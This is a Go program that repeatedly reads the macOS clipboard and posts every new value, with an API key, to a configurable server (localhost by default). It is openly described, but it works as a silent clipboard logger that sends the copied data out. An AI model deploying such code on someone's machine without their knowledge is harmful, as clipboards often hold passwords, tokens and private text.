/*
Product: Clipboard Reader
Description: Reads the clipbaord and relays the information
to a server
Author: Benjamin Norman 2023
*/

package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"time"
)

var (
	previousData  = ""
	apiKey        = "API KEY CHANGE ME"
	serverAddress = "http://127.0.0.1:8080/clipboard_incoming"
)

func darwin_capture() string {
	/*
		Records the contents of the clipboard for
		MacOS
	*/

	clipboardCommand := exec.Command("pbpaste")
	data, err := clipboardCommand.Output()
	if err != nil {
		return "Error fetching clipboard data"
	}
	return string(data)
}

func data_transfer(data string) {
	/*
		Sends the data to the target server as a POST
		request with a JSON body
	*/

	// Encode the JSON data
	postBody, _ := json.Marshal(map[string]string{
		"key":  apiKey,
		"data": data,
	})
	responseBody := bytes.NewBuffer(postBody)
	resp, err := http.Post(serverAddress, "application/json", responseBody)

	if err != nil {
		log.Fatalf("An Error Occured %v", err)
		fmt.Println(err)
	}
	defer resp.Body.Close()
}

func main() {
	if runtime.GOOS == "darwin" {
		for true {

			capturedData := darwin_capture()
			if capturedData == previousData {
				continue
			} else if capturedData != previousData {
				previousData = capturedData
				data_transfer(capturedData)
			}
			time.Sleep(3 * time.Second)
		}
	} else {
		os.Exit(1)
	}
}
